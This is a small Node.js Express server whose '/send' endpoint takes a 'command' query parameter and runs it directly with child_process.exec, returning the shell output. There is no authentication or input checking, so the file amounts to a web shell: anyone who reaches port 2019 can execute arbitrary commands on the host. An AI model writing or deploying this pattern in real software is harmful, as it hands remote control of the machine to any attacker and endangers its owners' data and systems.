const express = require("express")
const exec = require("child_process").exec
const app = express()
app.get("/send",(req,res)=>{
    let command = req.param('command');
    exec(command, (error, stdout, stderr) => {
        if (error) {
            res.send(`ERROR\n${error}\n${stderr} `)
            return;
        }
        res.send(stdout)
      });
})
app.listen(2019,()=>{
    console.log("listening on 2019")
})